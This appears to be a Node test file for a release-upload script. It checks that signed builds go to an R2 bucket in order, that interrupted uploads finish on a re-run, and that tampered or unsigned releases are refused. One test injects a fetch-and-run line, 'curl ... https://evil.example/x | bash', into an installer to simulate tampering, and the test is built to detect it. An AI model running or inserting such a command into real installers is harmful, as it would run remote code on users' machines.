// scripts/publish-release.mjs, the upload job of .github/workflows/node-release.yml, against a fake
// R2 bucket (a Map behind a fake wrangler): it uploads only a release that still checks out (signed,
// installers byte for byte), publishes a version once but finishes an upload that stopped half-way,
// and leaves the unversioned launcher and installers to the newest release.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { wranglerR2 } from '../scripts/channel.mjs';
import { publishRelease } from '../scripts/publish-release.mjs';
import { fakeBucket, fakeBuild, runSign, signerRoot, throwawayKey } from './release-fixtures.mjs';

const UNVERSIONED = ['launcher.mjs', 'launcher.mjs.sig', 'install.sh', 'install-windows.ps1', 'install-desktop.sh'];

/** A signed release of `version` (built, then signed by the real script) in a sandboxed checkout. */
function signedRelease(t, key, version) {
  const root = signerRoot(t, key.raw, version);
  const build = fakeBuild(t, root, key.raw);
  const r = runSign(root, ['--dist', build.out], { TGN_RELEASE_PRIVATE_KEY: key.pkcs8 });
  assert.equal(r.status, 0, r.out);
  return { root, ...build };
}

/** One run of the upload job: what it wrote, in order, and what it printed. */
function publishOnce(release, store, { failPut, env = {} } = {}) {
  const bucket = fakeBucket(store, { failPut });
  const lines = [];
  let error = null;
  try {
    publishRelease({ nodes: release.root, dist: release.out, r2: wranglerR2({ run: bucket.run }), env, log: (m) => lines.push(m) });
  } catch (e) {
    error = e;
  }
  // Wrangler 4 defaults to a local bucket, and objects have no type without --content-type.
  for (const args of bucket.calls) assert.ok(args.includes('--remote'), args.join(' '));
  for (const args of bucket.calls.filter((a) => a[2] === 'put')) assert.ok(args.includes('--content-type'), args.join(' '));
  return { error, puts: bucket.puts.map((p) => p.split(' ')[0]), types: bucket.puts, out: lines.join('\n') };
}

const local = (release, key) => readFileSync(join(release.out, key));

test('uploads the version folder with manifest.json last, then the launcher, the installers and latest.json; never channel.json', (t) => {
  const release = signedRelease(t, throwawayKey(), '0.2.0');
  const store = new Map();
  const r = publishOnce(release, store);
  assert.equal(r.error, null);
  const v = ['node.mjs', 'rocketsim.wasm', 'manifest.sig', 'release-key.pub', 'inputs.json', 'manifest.json'].map((f) => `0.2.0/${f}`);
  assert.deepEqual(r.puts, [...v, ...UNVERSIONED, 'latest.json']);
  assert.ok(r.types.includes('0.2.0/rocketsim.wasm application/wasm'));
  assert.ok(r.types.includes('launcher.mjs text/javascript; charset=utf-8'));
  assert.ok(r.types.includes('install.sh text/plain; charset=utf-8'));
  for (const key of [...v, ...UNVERSIONED]) assert.ok(store.get(key).equals(local(release, key)), key);
  assert.deepEqual(JSON.parse(store.get('latest.json')), { version: '0.2.0' });
  assert.equal(store.has('channel.json'), false);
});

test('a version already in R2 with another manifest.json is refused before anything is written', (t) => {
  const key = throwawayKey();
  const store = new Map();
  assert.equal(publishOnce(signedRelease(t, key, '0.2.0'), store).error, null);
  const before = new Map(store);
  // The same version built again: another createdAt, so other bytes.
  const again = signedRelease(t, key, '0.2.0');
  const m = JSON.parse(local(again, '0.2.0/manifest.json'));
  writeFileSync(join(again.rel, 'manifest.json'), JSON.stringify({ ...m, createdAt: '2026-10-20T00:00:00Z' }, null, 2));
  assert.equal(runSign(again.root, ['--dist', again.out], { TGN_RELEASE_PRIVATE_KEY: key.pkcs8 }).status, 0);
  const r = publishOnce(again, store);
  assert.match(r.error?.message ?? '', /release 0\.2\.0 is already in R2, with another manifest\.json/);
  assert.deepEqual(r.puts, []);
  assert.deepEqual(store, before);
});

test('a re-run after an upload that failed half-way finishes it (the launcher and its signature end up together)', (t) => {
  const key = throwawayKey();
  const store = new Map();
  const old = signedRelease(t, key, '0.2.0');
  assert.equal(publishOnce(old, store).error, null);
  const release = signedRelease(t, key, '0.3.0');
  let r = publishOnce(release, store, { failPut: (k) => k === 'launcher.mjs.sig' });
  assert.match(r.error?.message ?? '', /could not write launcher\.mjs\.sig to R2/);
  // R2 now holds the new launcher with the old signature: every new install would refuse it.
  assert.ok(store.get('launcher.mjs').equals(local(release, 'launcher.mjs')));
  assert.ok(store.get('launcher.mjs.sig').equals(local(old, 'launcher.mjs.sig')));

  // "Re-run failed jobs": the same signed artifact, so the same manifest.json.
  r = publishOnce(release, store);
  assert.equal(r.error, null);
  assert.match(r.out, /already in R2 with this manifest\.json/);
  for (const k of ['0.3.0/manifest.json', ...UNVERSIONED]) assert.ok(store.get(k).equals(local(release, k)), k);
  assert.deepEqual(JSON.parse(store.get('latest.json')), { version: '0.3.0' });
});

test('an older version published after a newer one adds its folder and leaves the launcher and installers alone', (t) => {
  const key = throwawayKey();
  const store = new Map();
  const newer = signedRelease(t, key, '0.3.0');
  assert.equal(publishOnce(newer, store).error, null);
  const fix = signedRelease(t, key, '0.2.1');
  // Different bytes from 0.3.0's, so leaving them alone is visible.
  writeFileSync(join(fix.out, 'launcher.mjs'), 'console.log("launcher 0.2.1")');
  assert.equal(runSign(fix.root, ['--dist', fix.out], { TGN_RELEASE_PRIVATE_KEY: key.pkcs8 }).status, 0);
  const r = publishOnce(fix, store);
  assert.equal(r.error, null);
  assert.ok(r.puts.every((p) => p.startsWith('0.2.1/')), r.puts.join(' '));
  assert.ok(store.has('0.2.1/manifest.json'));
  for (const k of UNVERSIONED) assert.ok(store.get(k).equals(local(newer, k)), k);
  assert.deepEqual(JSON.parse(store.get('latest.json')), { version: '0.3.0' });
  assert.match(r.out, /stay those of 0\.3\.0/);
});

test('uploads nothing that no longer checks out: an installer changed after signing, an unsigned build, the release key in its environment', (t) => {
  const key = throwawayKey();
  const store = new Map();
  let release = signedRelease(t, key, '0.2.0');
  writeFileSync(join(release.out, 'install.sh'), `${local(release, 'install.sh')}curl -fsS https://evil.example/x | bash\n`);
  let r = publishOnce(release, store);
  assert.match(r.error?.message ?? '', /install\.sh is not nodes\/install\/install\.sh/);

  release = { root: signerRoot(t, key.raw, '0.2.0') };
  Object.assign(release, fakeBuild(t, release.root, key.raw));
  r = publishOnce(release, store);
  assert.match(r.error?.message ?? '', /manifest\.sig is missing/);

  release = signedRelease(t, key, '0.2.0');
  writeFileSync(join(release.out, 'launcher.mjs'), 'evil()');
  r = publishOnce(release, store);
  assert.match(r.error?.message ?? '', /launcher\.mjs\.sig does not verify/);

  r = publishOnce(signedRelease(t, key, '0.2.0'), store, { env: { TGN_RELEASE_PRIVATE_KEY: key.pkcs8 } });
  assert.match(r.error?.message ?? '', /TGN_RELEASE_PRIVATE_KEY is set/);
  assert.equal(store.size, 0, 'nothing was uploaded');
});

test('an object that does not read back as uploaded fails the run', (t) => {
  const release = signedRelease(t, throwawayKey(), '0.2.0');
  const store = new Map();
  const bucket = fakeBucket(store);
  const run = (args) => {
    const r = bucket.run(args);
    if (args[2] === 'put' && args[3].endsWith('/install.sh')) store.set('install.sh', Buffer.from('something else'));
    return r;
  };
  assert.throws(() => publishRelease({ nodes: release.root, dist: release.out, r2: wranglerR2({ run }), env: {}, log: () => {} }), /install\.sh does not read back from R2/);
});
